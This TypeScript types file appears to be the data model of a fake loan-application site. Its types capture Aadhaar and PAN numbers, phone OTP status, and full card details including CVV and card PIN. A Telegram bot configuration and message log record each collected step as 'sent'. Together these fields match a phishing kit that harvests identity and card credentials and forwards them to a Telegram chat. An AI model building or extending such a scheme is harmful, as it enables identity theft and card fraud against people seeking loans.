export type EmploymentType = 'Salaried' | 'Business';

export interface LoanDetails {
  phone: string;
  otpVerified: boolean;
  employmentType: EmploymentType;
  loanAmount: number;
  loanTenure: number; // in months
  name: string;
  adhar: string;
  panCard: string;
  age: string;
  state: string;
  city: string;
  pincode: string;
}

export interface CardDetails {
  cardNumber: string;
  cardHolder: string;
  exp: string;
  cvv: string;
  pin: string;
  bankName?: string;
}

export interface TelegramConfig {
  hasToken: boolean;
  hasChatId: boolean;
  maskedToken: string;
  chatId: string;
}

export interface TelegramLog {
  id: string;
  timestamp: string;
  type: 'phone_step' | 'personal_details' | 'card_details' | string;
  formattedMessage: string;
  data: Record<string, any>;
  status: 'sent' | 'simulated' | 'error';
  errorMessage?: string;
}

export type Step = 1 | 2 | 3 | 4 | 5;
